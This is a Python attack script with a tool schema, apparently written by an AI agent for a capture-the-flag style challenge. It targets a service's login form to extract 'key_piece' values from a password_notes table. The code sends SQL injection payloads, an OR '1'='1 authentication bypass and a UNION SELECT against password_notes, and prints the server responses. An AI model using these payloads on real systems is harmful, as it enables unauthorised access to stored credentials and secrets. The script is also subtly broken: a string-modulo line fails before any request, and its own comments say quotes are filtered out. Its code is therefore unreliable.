SCHEMA = {
  "name": "extract_key_pieces",
  "description": "Connecte au service, crée un utilisateur et tente d'extraire les key_piece via SQLi",
  "parameters": {
    "properties": {
      "host": {
        "type": "string"
      },
      "port": {
        "type": "integer"
      }
    },
    "required": [
      "host",
      "port"
    ],
    "type": "object"
  }
}

def main(args):
    import requests
    from urllib.parse import urljoin

    host = args["host"]
    port = args["port"]
    base = f"http://{host}:{port}"

    # D'abord, regardons la page d'accueil
    resp = requests.get(base)
    print("=== Accueil ===")
    print(resp.status_code)

    # Essayons de voir le schéma de la DB via SQLi
    # La requête dans login_directory est: SELECT old_account_number FROM login_directory WHERE display_name='{cleaned}'
    # cleaned = re.sub(r"[^A-Za-z0-9.]","")[:32]

    # Essayons une injection UNION pour extraire les key_piece
    # On doit d'abord s'inscrire pour avoir accès à la requête SELECT key_piece FROM password_notes ORDER BY phase

    # Créons un utilisateur
    username = "test" + str(hash(base)) % 10000
    password = "password123"

    # Inscription - c'est là que la requête SELECT key_piece est exécutée
    # Mais on ne voit pas le résultat directement... il faut peut-être regarder le vault

    # D'abord, voyons si on peut voir le schéma via une erreur SQL
    # Essayons une injection dans le login
    login_url = f"{base}/login"
    # On essaie un username qui va causer une erreur SQL
    test_user = "admin' OR '1'='1"
    resp = requests.post(login_url, data={"username": test_user, "password": "anything"})
    print(f"\n=== Login test avec injection ===")
    print(f"Status: {resp.status_code}")
    print(f"Texte: {resp.text[:500]}")

    # Maintenant, essayons d'extraire les key_piece via UNION dans le login
    # La requête est: SELECT old_account_number FROM login_directory WHERE display_name='{cleaned}'
    # On veut faire: SELECT key_piece FROM password_notes ORDER BY phase

    # Mais d'abord, regardons si on peut voir le contenu du vault après inscription
    # Le vault est chiffré avec encrypt_password qui utilise la clé

    # Essayons de voir si on peut extraire via une injection UNION
    # On essaie: admin' UNION SELECT key_piece FROM password_notes--
    injection = "admin' UNION SELECT key_piece FROM password_notes--"
    resp = requests.post(login_url, data={"username": injection, "password": "anything"})
    print(f"\n=== Injection UNION ===")
    print(f"Status: {resp.status_code}")
    print(f"Texte: {resp.text[:1000]}")

if __name__ == "__main__":
    import json as _json, sys as _sys
    _args = _json.loads(_sys.argv[1]) if len(_sys.argv) > 1 else {}
    main(_args)
